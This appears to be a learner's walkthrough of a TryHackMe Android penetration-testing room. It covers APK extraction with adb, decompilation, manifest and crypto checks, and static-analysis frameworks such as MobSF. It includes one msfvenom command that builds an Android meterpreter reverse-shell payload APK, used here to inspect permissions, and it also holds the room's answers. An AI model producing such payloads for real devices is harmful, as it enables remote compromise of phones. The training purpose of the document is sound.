<h1 align="center">Android Hacking 101</h1>
<p align="center">2025, August 19<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>469</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Android Mobile Application Penetration Testing</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/d4b70e24-b3e5-45eb-9209-6917d009c79c"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/androidhacking101">here </a>.<br>
<img width="1200px" src=""></p>


<br>
<h2>Task 1 .  Introduction</h2>
<br>

<p><em>Answer the question below</em></p>

<p>1.1. Read the above!<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 2 . Setup environment</h2>
<br>

<p><em>Answer the question below</em></p>

<p>2.1. Read the above!<br>
<code>No answer needed</code></p>

<br>

<img width="1035" height="277" alt="image" src="https://github.com/user-attachments/assets/ab05d692-d5d1-4f30-abdb-4399cec451e6" />

<br>
<br>

<img width="974" height="351" alt="image" src="https://github.com/user-attachments/assets/ef8cc380-88bb-4208-be3b-58577a25c65f" />



<br>
<br>
<h2>Task 3 . Methodology</h2>
<p>

- Information Gathering<br>
- Reversing<br>
- Static Analysis<br>
- Dinamyc Analysis<br>
- Report</p>


<p><em>Answer the question below</em></p>

<p>3.1. <br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 4 . Information Gathering</h2>
<p>Information collection is the first thing we need to do, as this information will guide us to the next stage in our penetration tests.<br>

<code>Black Box</code>: In penetration testing, black-box testing refers to a method where an ethical hacker has no knowledge of the system being attacked.<br>

How do I find the application of the organization?<br>

Easy, <code>play store</code>: is a digital distribution platform for mobile apps for devices with Android operating system.<br><br>

<code>White Box</code>: White box penetration testing can also be called glass box penetration testing or clear box penetration testing. In any case, it's an approach to penetration testing that relies on the knowledge of the target system's internal configuration. It uses this information for the test cases.<br>

In a real scenario the client it will give us the mobile app, users and passwords to perform the login and also a user manual of how the application works.</p>

<h3>Important</h3>
<p>Not use an online services for download the apk file, don't knows if we're analyzing the real app.</p>

<p><em>Answer the question below</em></p>

<p>4.1. What is the package name of the Black Hat Europe?<br>
<code>com.swapcard.apps.android.blackhat</code></p>
<br>

<img width="942" height="283" alt="image" src="https://github.com/user-attachments/assets/5381f425-ac96-425e-b318-5e2fd84eba30" />

<br>
<br>
<h2>Task 5 . Reversing</h2>
<p>In this part we will extract the legitimate apk from emulator or the device and get the source code.</p>

<h3>TOOL</h3>
<p><code>Android Debug Bridge</code> (ADB) is a development tool that facilitates communication between an Android device and a personal computer.</p>

<h4>How to view devices?</h4>

```bash
adb devices
```

<h4>How to extract apk?</h4>
<p>For this you need have installed the application in your device and know package name<./p>

```bash
adb shell pm path package_name
```

<p>This command print the path to the APK of the given.</p>

```bash
adb pull <remote> [<locaDestination>]
```

<h3>Now,how a get source code?</h3>
<p><code>jadx</code>: The jadx suite allows you to simply load an APK and look at its Java source code. What’s happening under the hood is that jADX is decompiling the APK to smali and then converting the smali back to Java.<br>

Usage:</p>

```bash
jadx -d [path-output-folder] [path-apk-or-dex-file]
```
<p>This command pulls the file remote to local. If local isn’t specified, it will pull to the current folder.</p>

<br>
<br>

<p><code>Dex2Jar</code>:  use dex2jar to convert an APK to a JAR file.</p>

```bash
d2j-dex2jar.sh or .bat /path/application.apk
```

<p>Once you have the JAR file, simply open it with JD-GUI and you’ll see its Java code.</p>

<br>
<br>

<p><code>apktool</code>:  This tool get a source code in smali.</p>

```bash
apktool d file.apk
```

<br>
<br>

<p><codejadx-gui</code>:   UI version of jadx.</p>

```bash
jadx\bin\jadx-gui
```

<p><em>Answer the question below</em></p>

<p>5.1. Tool for convert dex file to smali code?<br>
<code>d2j-dex2smali</code></p>

<br>

<p>5.2. Which is the option for build apps with apktool?<br>
<code>b</code></p>

<br>

<p>5.3. What is the apk path of Black Hat Europe?<br>
<code>/data/app/com.swapcard.apps.android.blackhat=/base.apk</code></p>

<br>

<p>5.4. Command for extract apk of Back Hat Europe? Note: command and path<br>
<code>adb pull /data/app/com.swapcard.apps.android.blackhat=/base.apk</code></p>


<br>
<br>
<h2>Task 6 .Static analysis</h2>

<p>Is done without running the program, what are we going to identify in this basic room?<br>

- Weak or improper cryptography use<br>
- Exported Preference Activities<br>
- Apps which enable backups<br>
- Apps which are debuggable<br>
- App Permissions<br>
- Firebase Instance(s)<br>
- Sensitive data in the code</p>

<h3>Weak or improper cryptography use:</h3>
<p> Incorrect uses of encryption algorithm may result in sensitive data exposure, key leakage, broken authentication, insecure session and spoofing attack.<br>

Example: For Java implementation, the following API is related to encryption. Review the parameters of the encryption implementation.</p>

```bash
IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
```

<br>

```bash
SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
```

<br>

<p>How to search this when I have the source code of the application? there is a super advanced tool and wonderful  called grep.</p>

```bash
grep -r "SecretKeySpec" *
```

<br>

```bash
grep -rli "aes" *
```

<br>


```bash
grep -rli "iv"
```

<br>
<br>
<p>Open the file with you favorite editor of text. Gedit/Vim/subl, etc… use this for revolse a puzzle in my ctf "LaxCTF".</p>

<p><strong>Solution</strong>: Use a cryptography asymmetric.</p>

<br>

<h3>Exported Preference Activities</h3>
<p>As we know, Android's activity component is application screen(s) and the action(s) that applied on that screen(s) when we use the application. When as activity is found to be shared with other apps on the device therefore leaving it accessible to any other application on the device.<br>

Okay, exploit this in dynamic analysis... How identify the activity is exported?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

```bash
cat AndroidManifest.xml | grep "activity" --color
```

<h3>Apps which enable backups</h3>
<p>This is considered a security issue because people could backup your app via ADB and then get private data of your app into their PC.<br>

- Shared preference.<br>
- directory returned by getFilesDir().<br>
- getDataBase(path) also includes files created by SQLiteOpenHelper.<br>
- files in directories created with getDir(Sring, int).<br>
- files on external storage returned by getExternalFilesDir (String type).</p>

<p>How identify this?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

<p>Real scenario? you use your mind for this exercice :3.<br>

Solution: android:allowBackup="false"<br>

Example in dynamic analysis, byee!</p>

<h3>App Permissions</h3>
<p>System permissions are divided into two groups: “normal” and “dangerous.” Normal permission groups are allowed by default, because they don’t pose a risk to your privacy. (e.g., Android allows apps to access the Internet without your permission.) Dangerous permission groups, however, can give apps access to things like your calling history, private messages, location, camera, microphone, and more. Therefore, Android will always ask you to approve dangerous permissions.<br>

In earlier versions of Android, accepting potentially dangerous permission groups was an all-or-nothing affair. You either allowed all permissions an app needed to function — before installation — or you declined them all, which meant you couldn’t install the app.<br>

I going to analyze the permissions of an apk app generated by metasploit.</p>

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > /root/tryhackme.apk
```

<p>Okay, HOW?<br>

With your favorite editor of text. Gedit/Vim/subl, etc… open the AndroidManifest.xml or use cat and grep.</p>

<h3>Firebase Instance(s)</h3>
<p>Last year, security researchers have discovered unprotected Firebase databases of thousands of iOS and Android mobile applications that are exposing over 100 million data records, including plain text passwords, user IDs, location, and in some cases, financial financial records such as banking and cryptocurrency transactions.<br>

Google's Firebase service is one of the most popular back-end development platforms for mobile and web applications that offers developers a cloud-based database, which stores data in JSON format and synced it in the real-time with all connected clients.<br>

How identify this?<br>

FireBase Scanner, The scripts helps security analsts to identify misconfigured firebase instances.</p>

```bash
git clone https://github.com/shivsahni/FireBaseScanner
```

<br>

```bash
python FireBaseScanner.py -p /path/apk
```


<br>
<h3>Sensitive data in the cod</h3>
<p> Users, passwords, internal IP and more ... <br>

With your favorite editor of text, Gedit/Vim/subl, etc…, grep or GUI decompiler back to reversing and experiment with your favorite tool.</p>

<p>In the real life exist very bad practice of programing! </p>

<br>
<h3>How to automatize this process?</h3>
<p>It is very entertaining to do this manually, but in a real pentest the time is not our friend.</p>

<h1 aign="center"> STATIC ANALYSIS - FRAMEWORKS</h1>
<br>
<h3>MARA Framework/h3>
<p>Is a Mobile Application Reverse engineering and Analysis Framework. It is a tool that puts together commonly used mobile application reverse engineering and analysis tools, to assist in testing mobile applications against the OWASP mobile security threats. Its objective is to make this task easier and friendlier to mobile application developers and security professionals.</p>
<h4>Features:</h4>
<h5>APK Manifest Analysis</h5>

<p>

- Extract Intents<br>
- Extract exported activities<br>
- Extract receivers<br>
- Extract exported receivers<br>
- Extract Services<br>
- Extract exported services<br>
- Check if apk is debuggable<br>
- Check if apk allows backups<br>
- Check if apk allows sending of secret codes<br>
- Check if apk can receive binary SMS</p>

<h5>Security Analysis</h5>
<p>Source code static analysis based on OWASP Top Mobile Top 10 and the OWASP Mobile Apps Checklist<br>
MARA is capable of performing either single or mass analysis of apk, dex or jar files.<br>

and more....</p>


<h3>Quark</h3>
<p>Is a static code analysis tool, designed to recognize potential security vulnerabilities and points of concern for Java-based Android applications. QARK was designed to be community based, available to everyone and free for use. QARK educates developers and information security personnel about potential risks related to Android application security, providing clear descriptions of issues and links to authoritative reference sources. QARK also attempts to provide dynamically generated ADB (Android Debug Bridge) commands to aid in the validation of potential vulnerabilities it detects. It will even dynamically create a custom-built testing application, in the form of a ready to use APK, designed specifically to demonstrate the potential issues it discovers, whenever possible.</p>

<h3>MobSF</h3>
<p>My favorite tool :3 is Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis.</p>




<p>

- <code>Information<br>: Display data such as app icon, app name, size, package name etc.MD5 & SHA1 are also shown. They can be useful to detect known malicious applications.<br>
- <code> Scan options</code>: Rescan the application, Start the dynamic analysis, Check the java code & the manifest file
- <br>
- <code>Signer certificate</code>: Display certificate info, Determine if an application has come from its original source.<br>
- <code>Permissions</code>: Analyzes the permissions, Determines its status concerning critically & the description of permissions.<br>
- <code>Binary analysis</code>: It is threat assessment & vulnerability testing at the binary code level. It can also be used to analyze third party libraries, allowing a richer analysis & better visibility into how applications will interact with libraries. This is analysis of binary code to identify security issues. For complex systems using third party libraries for which source code is not available binary code analysis helps to identify issues.<br>
- <code>Android API</code>: You can view android API used in app like java reflection, location.<br>
- <code>Browsable activities</code>: That can be safely invoked from a browser.<br>
- <code>Security analysis</code>:<br>Manifest analysis: Find vulnerability inside one of the components in the AndroidManifest.xml file.<br>Code analysis: Analysis result of java code by a static analyzer. Identifies potential vulnerabilities, determines their severity & the files in which this type of vulnerability was found.CVSS. Common Vulnerability Scoring System. Vulnerability is assigned a CVSS base score between 0.0 & 10.0.<br>0.0 → No risk<br>0.1–3.9 → Low risk<br>4.0–6.9 → Medium risk<br>7.0–8.9 → High risk<br>9.0–10.0 → Critical risk score<br>CWE :<br>Common Weakness Enumeration<br>· It is a list of software architecture, design or a code weakness.<br>
- <code>File analysis</code>: Shows analysis of files.<br>
- <code>Malware analysis</code>: Determine the functionality, origin & potential impact of a given malware sample such as virus.<br>
- <code>Reconnaissance</code><be>URL: Display list of URLs, IP addresses & the files in which they are stores or called. Analyzes where the android app sends the data & where it stores the info.<br>Emails<br>Strings: Analyzes the text files that are in the res directory. May contain sensitive data.<br>
- <code>Components</code>: Display a complete list of components (activity, service, content provider & receiver), imported libraries & files without defining the extension.</p>
